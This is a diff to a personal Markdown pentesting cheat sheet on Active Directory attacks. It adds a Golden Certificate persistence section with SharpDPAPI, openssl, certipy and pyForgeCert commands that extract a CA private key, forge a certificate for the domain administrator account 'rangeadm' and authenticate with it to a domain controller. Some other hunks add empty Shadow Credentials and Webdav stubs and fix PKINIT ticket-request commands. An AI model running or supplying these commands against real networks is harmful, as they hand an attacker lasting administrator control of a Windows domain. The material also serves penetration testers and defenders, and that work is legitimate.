@@ -57,12 +57,14 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Dump Domain Objects](#dump-domain-objects)
 	* [Store SOCKS Sessions](#store-socks-sessions)
 	* [Request User Certificate](#request-user-certificate)
+	* [Shadow Credentials](#shadow-credentials)
 	* [ESC8](#esc8)
-	* [Webdav to RBCD/Shadow Creds](#webdav-to-rbcd/shadow-creds)
+	* [Webdav to LDAP(S)](#webdav-to-ldap(s))
 	* [NetNTLMv1 to LDAP](#netntlmv1-to-ldap)
 * **[Persistence](#persistence)**
 	* [Golden Ticket](#golden-ticket)
 	* [Diamond Ticket](#diamond-ticket)
+	* [Golden Certificate](#golden-certificate)
 	* Skeleton Keys
 	* Shortcuts
 	* [msDS-AllowedToDelegateTo](#msds-allowedtodelegateto)
@@ -665,11 +667,16 @@ ntlmrelayx.py -t http://ca01.range.net/certsrv/certfnsh.asp -smb2support --adcs 
 python3 PetitPotam.py 192.168.86.193 192.168.86.182
 ```
 
+### Shadow Credentials
+```
+
+```
+
 ### ESC8
 ```
 ```
 
-### Webdav to RBCD/Shadow Creds
+### Webdav to LDAP(S)
 ```
 ```
 
@@ -735,6 +742,44 @@ Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcb
 .\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
 ```
 For detailed explanation, read this article by Semperis [here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
+
+### Golden Certificate
+The title is basically self explanatory, this attack is pretty much the same as golden certificate where you forge a certificate offline with a compromised private key on a CA server *(Having system access on a CA)*. Therefore, it can be used to forge a certificate and sign it with the private key to be used later on for persistence purposes. A certificate will normally valid up until 1 year duration. 
+1. Extract private key from CA
+```
+SharpDPAPI.exe certificates /machine
+```
+2. Copy the cert into a .pem file and convert to a usable format (.pfx) to perform [Pass-The-Certificate](#pass-the-certificate) attack. *Note that this will require a user defined password*
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+3. Forge a certificate
+```
+# certipy
+1. convert pfx to a certipy usable cert (no password)
+certipy cert -export -pfx cert.pfx -password admin -out final.pfx
+
+2. forge a certificate 
+certipy forge -ca-pfx final.pfx -upn rangeadm@range.net -subject 'CN=rangeadm,CN=Users,DC=RANGE,DC=NET'
+
+3. authenticate with the certificate and win!
+certipy auth -pfx rangeadm_forged.pfx -dc-ip 192.168.86.183
+
+# pyForgeCert
+1. using PEM cert (you can skip step 2 for this one)
+python pyForgeCert.py -i cert.pem -o admin.pfx
+
+2. using PFX cert
+python pyForgeCert.py -i cert.pfx -o admin.pfx -pfx -p admin
+
+3. Use Pass-The-Certificate and win!
+```
+
+**References**
+* https://pentestlab.blog/2021/11/15/golden-certificate/
+* https://github.com/Ridter/pyForgeCert
+* https://github.com/ly4k/Certipy
+
 
 ### msDS-AllowedToDelegateTo
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
@@ -1161,7 +1206,7 @@ python3 certi.py req '<domain>/<username>@<ca-server>' <ca-service-name> -k -n -
 Rubeus.exe asktgt /user:lowpriv /certificate:cert.pfc /password:P@$$w0rd
 
 # Linux
-python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pfx-pass <certificate-password> admin_tgt.ccache   
+python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pfx-pass <certificate-password> -dc-ip 192.168.86.183 admin_tgt.ccache   
 ```
 5. Retrieve NTLM hash (optional)
 At this point, you can either use environment variable `KRB5CCNAME` to be used with ccache file or you can either get ntlm hash from the ticket with the following Commands
@@ -1212,7 +1257,7 @@ Permissions
 python3 certi.py req range.net/peter:'Welcome1234'@CA01.range.net range-CA01-CA -k -n --template 'VulnUser' --alt-name 'rangeadm'
 ```
 
-3. A pfx certificate should now be retrieved. Run the following command to request tgt by using the ceritifcate by using [gettgtpkinit.py]()
+3. A pfx certificate should now be retrieved. Run the following command to request tgt by using the ceritifcate by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
 ```
 python3 gettgtpkinit.py range.net/rangeadm -cert-pfx /opt/certi/rangeadm@range.net.pfx -pfx-pass 'admin' -dc-ip 10.8.0.2 /tmp/rangeadm.ccache
 ```
